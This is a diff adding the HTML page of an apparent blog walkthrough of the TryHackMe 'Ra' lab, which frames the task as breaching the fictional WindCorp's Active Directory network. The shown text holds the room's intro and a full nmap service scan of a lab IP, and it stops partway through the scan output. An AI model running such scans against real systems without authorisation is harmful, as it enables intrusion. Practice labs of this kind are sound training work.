@@ -1,0 +1,704 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="World&#39;sEnd">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="You have gained access to the internal network of WindCorp, the multibillion dollar company, running an extensive social media campaign claiming to be unhackable (ha! so much for that claim!). Next st">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TryHackMe Walkthrough - Ra">
+<meta property="og:url" content="https://crazyinside.github.io/post/TryHackMe-Ra.html">
+<meta property="og:site_name" content="Network Security Notes">
+<meta property="og:description" content="You have gained access to the internal network of WindCorp, the multibillion dollar company, running an extensive social media campaign claiming to be unhackable (ha! so much for that claim!). Next st">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220708143519611.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220708144408730.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220708150128234.png">
+<meta property="article:published_time" content="2023-08-13T22:39:09.063Z">
+<meta property="article:modified_time" content="2023-08-11T15:52:06.055Z">
+<meta property="article:author" content="World&#39;sEnd">
+<meta property="article:tag" content="Active Directory">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220708143519611.png">
+  
+  
+  
+  <title>TryHackMe Walkthrough - Ra - Network Security Notes</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"crazyinside.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://raw.githubusercontent.com/Crazyinside/blog.image/main/material/wallhaven-x6dj5z_3840x2160.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="TryHackMe Walkthrough - Ra"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-14 06:39" pubdate>
+          August 14, 2023 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          31k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          255 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">TryHackMe Walkthrough - Ra</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>You have gained access to the internal network of WindCorp, the multibillion dollar company, running an extensive social media campaign claiming to be unhackable (ha! so much for that claim!).</p>
+<p>Next step would be to take their crown jewels and get full access to their internal network. You have spotted a new windows machine that may lead you to your end goal. Can you conquer this end boss and own their internal network?</p>
+<p>Happy Hacking! </p>
+<p>@4nqr34z and @theart42</p>
+<h6 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.92SVN scan initiated Fri Jul  8 14:19:08 2022 as: nmap -sC -sV -T4 -oA Ra -Pn -p- 10.10.121.103</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.121.103</span><br><span class="line">Host is up (0.28s latency).</span><br><span class="line">Not shown: 65498 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE             VERSION</span><br><span class="line">53/tcp    open  domain              Simple DNS Plus</span><br><span class="line">80/tcp    open  http                Microsoft IIS httpd 10.0</span><br><span class="line">|_http-title: Windcorp.</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">88/tcp    open  kerberos-sec        Microsoft Windows Kerberos (server time: 2022-07-08 06:28:07Z)</span><br><span class="line">135/tcp   open  msrpc               Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn         Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)</span><br><span class="line">443/tcp   open  ssl/http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2022-07-08T06:29:46+00:00; -1s from scanner time.</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title.</span></span><br><span class="line"><span class="string">| tls-alpn: </span></span><br><span class="line"><span class="string">|_  http/1.1</span></span><br><span class="line"><span class="string">| http-auth: </span></span><br><span class="line"><span class="string">| HTTP/1.1 401 Unauthorized\x0D</span></span><br><span class="line"><span class="string">|   Negotiate</span></span><br><span class="line"><span class="string">|_  NTLM</span></span><br><span class="line"><span class="string">| ssl-cert: Subject: commonName=Windows Admin Center</span></span><br><span class="line"><span class="string">| Subject Alternative Name: DNS:WIN-2FAA40QQ70B</span></span><br><span class="line"><span class="string">| Not valid before: 2020-04-30T14:41:03</span></span><br><span class="line"><span class="string">|_Not valid after:  2020-06-30T14:41:02</span></span><br><span class="line"><span class="string">| http-ntlm-info: </span></span><br><span class="line"><span class="string">|   Target_Name: WINDCORP</span></span><br><span class="line"><span class="string">|   NetBIOS_Domain_Name: WINDCORP</span></span><br><span class="line"><span class="string">|   NetBIOS_Computer_Name: FIRE</span></span><br><span class="line"><span class="string">|   DNS_Domain_Name: windcorp.thm</span></span><br><span class="line"><span class="string">|   DNS_Computer_Name: Fire.windcorp.thm</span></span><br><span class="line"><span class="string">|   DNS_Tree_Name: windcorp.thm</span></span><br><span class="line"><span class="string">|_  Product_Version: 10.0.17763</span></span><br><span class="line"><span class="string">445/tcp   open  microsoft-ds?</span></span><br><span class="line"><span class="string">464/tcp   open  kpasswd5?</span></span><br><span class="line"><span class="string">593/tcp   open  ncacn_http          Microsoft Windows RPC over HTTP 1.0</span></span><br><span class="line"><span class="string">636/tcp   open  ldapssl?</span></span><br><span class="line"><span class="string">2179/tcp  open  vmrdp?</span></span><br><span class="line"><span class="string">3268/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)</span></span><br><span class="line"><span class="string">3269/tcp  open  globalcatLDAPssl?</span></span><br><span class="line"><span class="string">3389/tcp  open  ms-wbt-server       Microsoft Terminal Services</span></span><br><span class="line"><span class="string">|_ssl-date: 2022-07-08T06:29:46+00:00; -1s from scanner time.</span></span><br><span class="line"><span class="string">| rdp-ntlm-info: </span></span><br><span class="line"><span class="string">|   Target_Name: WINDCORP</span></span><br><span class="line"><span class="string">|   NetBIOS_Domain_Name: WINDCORP</span></span><br><span class="line"><span class="string">|   NetBIOS_Computer_Name: FIRE</span></span><br><span class="line"><span class="string">|   DNS_Domain_Name: windcorp.thm</span></span><br><span class="line"><span class="string">|   DNS_Computer_Name: Fire.windcorp.thm</span></span><br><span class="line"><span class="string">|   DNS_Tree_Name: windcorp.thm</span></span><br><span class="line"><span class="string">|   Product_Version: 10.0.17763</span></span><br><span class="line"><span class="string">|_  System_Time: 2022-07-08T06:29:09+00:00</span></span><br><span class="line"><span class="string">| ssl-cert: Subject: commonName=Fire.windcorp.thm</span></span><br><span class="line"><span class="string">| Not valid before: 2022-07-07T06:19:03</span></span><br><span class="line"><span class="string">|_Not valid after:  2023-01-06T06:19:03</span></span><br><span class="line"><span class="string">5222/tcp  open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later</span></span><br><span class="line"><span class="string">|_ssl-date: 2022-07-08T06:29:49+00:00; -1s from scanner time.</span></span><br><span class="line"><span class="string">| xmpp-info: </span></span><br><span class="line"><span class="string">|   STARTTLS Failed</span></span><br><span class="line"><span class="string">|   info: </span></span><br><span class="line"><span class="string">|     capabilities: </span></span><br><span class="line"><span class="string">|     unknown: </span></span><br><span class="line"><span class="string">|     errors: </span></span><br><span class="line"><span class="string">|       invalid-namespace</span></span><br><span class="line"><span class="string">|       (timeout)</span></span><br><span class="line"><span class="string">|     stream_id: 4zivxtxln1</span></span><br><span class="line"><span class="string">|     auth_mechanisms: </span></span><br><span class="line"><span class="string">|     xmpp: </span></span><br><span class="line"><span class="string">|       version: 1.0</span></span><br><span class="line"><span class="string">|     compression_methods: </span></span><br><span class="line"><span class="string">|_    features: </span></span><br><span class="line"><span class="string">5223/tcp  open  ssl/hpvirtgrp?</span></span><br><span class="line"><span class="string">|_ssl-date: 2022-07-08T06:29:46+00:00; -1s from scanner time.</span></span><br><span class="line"><span class="string">| ssl-cert: Subject: commonName=fire.windcorp.thm</span></span><br><span class="line"><span class="string">| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm</span></span><br><span class="line"><span class="string">| Not valid before: 2020-05-01T08:39:00</span></span><br><span class="line"><span class="string">|_Not valid after:  2025-04-30T08:39:00</span></span><br><span class="line"><span class="string">5229/tcp  open  jaxflow?</span></span><br><span class="line"><span class="string">5262/tcp  open  jabber</span></span><br><span class="line"><span class="string">| fingerprint-strings: </span></span><br><span class="line"><span class="string">|   RPCCheck: </span></span><br><span class="line"><span class="string">|_    &lt;stream:error xmlns:stream=&quot;http://etherx.jabber.org/streams&quot;&gt;&lt;not-well-formed xmlns=&quot;urn:ietf:params:xml:ns:xmpp-streams&quot;/&gt;&lt;/stream:error&gt;&lt;/stream:stream&gt;</span></span><br><span class="line"><span class="string">| xmpp-info: </span></span><br><span class="line"><span class="string">|   STARTTLS Failed</span></span><br><span class="line"><span class="string">|   info: </span></span><br><span class="line"><span class="string">|     capabilities: </span></span><br><span class="line"><span class="string">|     unknown: </span></span><br><span class="line"><span class="string">|     errors: </span></span><br><span class="line"><span class="string">|       invalid-namespace</span></span><br><span class="line"><span class="string">|       (timeout)</span></span><br><span class="line"><span class="string">|     stream_id: 4fzrryvm4k</span></span><br><span class="line"><span class="string">|     auth_mechanisms: </span></span><br><span class="line"><span class="string">|     xmpp: </span></span><br><span class="line"><span class="string">|       version: 1.0</span></span><br><span class="line"><span class="string">|     compression_methods: </span></span><br><span class="line"><span class="string">|_    features: </span></span><br><span class="line"><span class="string">5263/tcp  open  ssl/unknown</span></span><br><span class="line"><span class="string">| ssl-cert: Subject: commonName=fire.windcorp.thm</span></span><br><span class="line"><span class="string">| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm</span></span><br><span class="line"><span class="string">| Not valid before: 2020-05-01T08:39:00</span></span><br><span class="line"><span class="string">|_Not valid after:  2025-04-30T08:39:00</span></span><br><span class="line"><span class="string">|_ssl-date: 2022-07-08T06:29:48+00:00; 0s from scanner time.</span></span><br><span class="line"><span class="string">5269/tcp  open  xmpp                Wildfire XMPP Client</span></span><br><span class="line"><span class="string">| xmpp-info: </span></span><br><span class="line"><span class="string">|   STARTTLS Failed</span></span><br><span class="line"><span class="string">|   info: </span></span><br><span class="line"><span class="string">|     capabilities: </span></span><br><span class="line"><span class="string">|     unknown: </span></span><br><span class="line"><span class="string">|     features: </span></span><br><span class="line"><span class="string">|     errors: </span></span><br><span class="line"><span class="string">|       (timeout)</span></span><br><span class="line"><span class="string">|     xmpp: </span></span><br><span class="line"><span class="string">|     auth_mechanisms: </span></span><br><span class="line"><span class="string">|_    compression_methods: </span></span><br><span class="line"><span class="string">5270/tcp  open  ssl/xmp?</span></span><br><span class="line"><span class="string">| ssl-cert: Subject: commonName=fire.windcorp.thm</span></span><br><span class="line"><span class="string">| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm</span></span><br><span class="line"><span class="string">| Not valid before: 2020-05-01T08:39:00</span></span><br><span class="line"><span class="string">|_Not valid after:  2025-04-30T08:39:00</span></span><br><span class="line"><span class="string">|_ssl-date: 2022-07-08T06:29:48+00:00; 0s from scanner time.</span></span><br><span class="line"><span class="string">5275/tcp  open  jabber</span></span><br><span class="line"><span class="string">| xmpp-info: </span></span><br><span class="line"><span class="string">|   STARTTLS Failed</span></span><br><span class="line"><span class="string">|   info: </span></span><br><span class="line"><span class="string">|     capabilities: </span></span><br><span class="line"><span class="string">|     unknown: </span></span><br><span class="line"><span class="string">|     errors: </span></span><br><span class="line"><span class="string">|       invalid-namespace</span></span><br><span class="line"><span class="string">|       (timeout)</span></span><br><span class="line"><span class="string">|     stream_id: 346zc75r8d</span></span><br><span class="line"><span class="string">|     auth_mechanisms: </span></span><br><span class="line"><span class="string">|     xmpp: </span></span><br><span class="line"><span class="string">|       version: 1.0</span></span><br><span class="line"><span class="string">|     compression_methods: </span></span><br><span class="line"><span class="string">|_    features: </span></span><br><span class="line"><span class="string">| fingerprint-strings: </span></span><br><span class="line"><span class="string">|   RPCCheck: </span></span><br><span class="line"><span class="string">|_    &lt;stream:error xmlns:stream=&quot;http://etherx.jabber.org/streams&quot;&gt;&lt;not-well-formed xmlns=&quot;urn:ietf:params:xml:ns:xmpp-streams&quot;/&gt;&lt;/stream:error&gt;&lt;/stream:stream&gt;</span></span><br><span class="line"><span class="string">5276/tcp  open  ssl/unknown</span></span><br><span class="line"><span class="string">| ssl-cert: Subject: commonName=fire.windcorp.thm</span></span><br><span class="line"><span class="string">| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm</span></span><br><span class="line"><span class="string">| Not valid before: 2020-05-01T08:39:00</span></span><br><span class="line"><span class="string">|_Not valid after:  2025-04-30T08:39:00</span></span><br><span class="line"><span class="string">|_ssl-date: 2022-07-08T06:29:46+00:00; -1s from scanner time.</span></span><br><span class="line"><span class="string">5985/tcp  open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span></span><br><span class="line"><span class="string">|_http-title: Not Found</span></span><br><span class="line"><span class="string">|_http-server-header: Microsoft-HTTPAPI/2.0</span></span><br><span class="line"><span class="string">7070/tcp  open  http                Jetty 9.4.18.v20190429</span></span><br><span class="line"><span class="string">|_http-server-header: Jetty(9.4.18.v20190429)</span></span><br><span class="line"><span class="string">|_http-title: Openfire HTTP Binding Service</span></span><br><span class="line"><span class="string">7443/tcp  open  ssl/http            Jetty 9.4.18.v20190429</span></span><br><span class="line"><span class="string">| ssl-cert: Subject: commonName=fire.windcorp.thm</span></span><br><span class="line"><span class="string">| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm</span></span><br><span class="line"><span class="string">| Not valid before: 2020-05-01T08:39:00</span></span><br><span class="line"><span class="string">|_Not valid after:  2025-04-30T08:39:00</span></span><br><span class="line"><span class="string">|_http-title: Openfire HTTP Binding Service</span></span><br><span class="line"><span class="string">|_http-server-header: Jetty(9.4.18.v20190429)</span></span><br><span class="line"><span class="string">7777/tcp  open  socks5              (No authentication; connection not allowed by ruleset)</span></span><br><span class="line"><span class="string">| socks-auth-info: </span></span><br><span class="line"><span class="string">|_  No authentication</span></span><br><span class="line"><span class="string">9090/tcp  open  zeus-admin?</span></span><br><span class="line"><span class="string">| fingerprint-strings: </span></span><br><span class="line"><span class="string">|   GetRequest: </span></span><br><span class="line"><span class="string">|     HTTP/1.1 200 OK</span></span><br><span class="line"><span class="string">|     Date: Fri, 08 Jul 2022 06:28:07 GMT</span></span><br><span class="line"><span class="string">|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT</span></span><br><span class="line"><span class="string">|     Content-Type: text/html</span></span><br><span class="line"><span class="string">|     Accept-Ranges: bytes</span></span><br><span class="line"><span class="string">|     Content-Length: 115</span></span><br><span class="line"><span class="string">|     &lt;html&gt;</span></span><br><span class="line"><span class="string">|     &lt;head&gt;&lt;title&gt;&lt;/title&gt;</span></span><br><span class="line"><span class="string">|     &lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;URL=index.jsp&quot;&gt;</span></span><br><span class="line"><span class="string">|     &lt;/head&gt;</span></span><br><span class="line"><span class="string">|     &lt;body&gt;</span></span><br><span class="line"><span class="string">|     &lt;/body&gt;</span></span><br><span class="line"><span class="string">|     &lt;/html&gt;</span></span><br><span class="line"><span class="string">|   HTTPOptions: </span></span><br><span class="line"><span class="string">|     HTTP/1.1 200 OK</span></span><br><span class="line"><span class="string">|     Date: Fri, 08 Jul 2022 06:28:16 GMT</span></span><br><span class="line"><span class="string">|     Allow: GET,HEAD,POST,OPTIONS</span></span><br><span class="line"><span class="string">|   JavaRMI, drda, ibm-db2-das, informix: </span></span><br><span class="line"><span class="string">|     HTTP/1.1 400 Illegal character CNTL=0x0</span></span><br><span class="line"><span class="string">|     Content-Type: text/html;charset=iso-8859-1</span></span><br><span class="line"><span class="string">|     Content-Length: 69</span></span><br><span class="line"><span class="string">|     Connection: close</span></span><br><span 